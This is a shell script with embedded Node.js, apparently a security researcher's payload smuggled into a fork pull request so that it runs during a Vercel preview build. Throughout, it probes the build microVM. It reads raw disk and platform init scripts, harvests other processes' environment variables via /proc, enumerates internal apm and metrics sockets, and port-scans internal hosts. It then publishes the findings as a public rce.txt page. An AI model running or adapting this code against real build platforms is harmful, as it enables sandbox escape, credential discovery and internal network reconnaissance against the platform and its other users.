#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 3: it is a Firecracker microVM
# per build. Hunt for anything that crosses a boundary: other processes'
# credentials, the internal apm HTTP service, raw disk, extra virtio devices.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== devices =="
  ls -la /dev 2>&1 | head -22
  echo -n "/sys/bus/virtio/devices: "; ls /sys/bus/virtio/devices 2>&1 | tr '\n' ' '
  echo
  for d in /sys/bus/virtio/devices/*; do
    echo -n "  $d type: "; cat "$d/device" 2>&1 | head -1
  done

  echo "== celld init script (platform internals, readable by untrusted code) =="
  head -30 /opt/vercel/celld-init.sh 2>&1

  echo "== raw disk read proof (/dev/vda) =="
  ls -la /dev/vda 2>&1
  dd if=/dev/vda bs=1M count=1 2>/dev/null | sha256sum 2>&1

  echo "== build caches sitting on the VM root =="
  ls -la /vercel/build_cache_init-JBv8Hq 2>&1 | head -6
  ls -la /vercel/malware-manifest-* 2>&1 | head -8
  echo -n "manifest sample: "; head -c 200 /vercel/malware-manifest-*/manifest* 2>&1 | head -c 200
  echo

  echo "== other processes in the VM: env vars they have that the build env does not =="
  node -e '
const fs=require("fs"),crypto=require("crypto");
const mine=new Set(Object.keys(process.env));
let out=[];
for(const pid of fs.readdirSync("/proc").filter(x=>/^[0-9]+$/.test(x))){
  let cl="",env=[];
  try{cl=fs.readFileSync("/proc/"+pid+"/cmdline").toString().replace(/\0/g," ").trim().slice(0,110);}catch(e){cl="(unreadable)";}
  try{env=fs.readFileSync("/proc/"+pid+"/environ").toString().split("\0").filter(x=>x.includes("="));}catch(e){}
  const vals=env.filter(x=>!mine.has(x.split("=")[0])).map(x=>{const k=x.split("=")[0],v=x.split("=").slice(1).join("=");return k+"="+crypto.createHash("sha256").update(v).digest("hex").slice(0,10)+"("+v.length+"b)";});
  out.push("  pid "+pid+" | "+cl+" | "+env.length+" vars | unique: "+(vals.map(x=>x.split("=")[0]).join(", ")||"none"));
  if(vals.length) out.push("      "+vals.slice(0,14).join("  "));
}
console.log(out.join("\n"));
'
  echo "== internal apm HTTP service: path enumeration =="
  node -e '
const net=require("net"),crypto=require("crypto");
const paths=["/","/health","/healthz","/status","/metrics","/v1","/v1/artifacts","/npm/foo","/packages/foo","/proxy/https://example.com/","/https://example.com/","/api","/version","/debug"];
let i=0;
const metricsProbe=()=>{
  const c=net.createConnection({path:"/run/metrics/metrics.sock",timeout:2500});
  let got="",done=false;
  const fin=(msg)=>{if(done)return;done=true;console.log("  metrics.sock -> "+msg);scan();};
  c.on("data",d=>got+=d);
  c.on("error",e=>fin("ERR "+e.code));
  c.on("connect",()=>{c.write("{}\n");c.write("PING\n");});
  c.on("close",()=>fin(got.length+"b: "+got.slice(0,140).replace(/\r?\n/g," ")));
};
const scan=()=>{
  const hosts=["169.254.0.1","169.254.0.3","169.254.1.1","10.0.0.1","127.0.0.1"];
  const ports=[80,443,8080,9090,4318,5555,3000];
  let results=[],n=0;
  const tryOne=()=>{
    if(n>=hosts.length*ports.length){return;}
    const h=hosts[Math.floor(n/ports.length)],p=ports[n++%ports.length];
    const c=net.createConnection({host:h,port:p,timeout:1200});
    let done=false;
    const fin=(open)=>{if(done)return;done=true;results.push({h,p,open});if(results.length===hosts.length*ports.length)report();};
    c.on("connect",()=>{fin(true);c.destroy();});
    c.on("error",()=>fin(false));
    c.on("timeout",()=>{c.destroy();fin(false);});
  };
  const report=()=>{
    console.log("== tcp scan of the cell network (hosts x ports) ==");
    results.filter(x=>x.open).forEach(x=>console.log("  OPEN "+x.h+":"+x.p));
    console.log("  closed/refused/timeout: "+results.filter(x=>!x.open).length+" of "+results.length);
  };
  for(let k=0;k<hosts.length*ports.length;k++) tryOne();
};
const next=()=>{
  if(i>=paths.length){metricsProbe();return;}
  const p=paths[i++];
  const c=net.createConnection({path:"/run/apm/apm.sock",timeout:2500});
  let got="",done=false;
  const fin=()=>{
    if(done)return;done=true;
    const h=crypto.createHash("sha256").update(got).digest("hex").slice(0,8);
    console.log("  "+p+" -> "+got.split("\r\n")[0]+" | "+got.length+"b sha "+h+" | "+got.slice(0,90).replace(/\r?\n/g," "));
    next();
  };
  c.on("data",d=>got+=d);
  c.on("error",e=>{if(!done){done=true;console.log("  "+p+" -> ERR "+e.code);next();}});
  c.on("connect",()=>c.write("GET "+p+" HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"));
  c.on("close",fin);
};
next();
'
} > "$F" 2>&1
sleep 3
cat "$F"
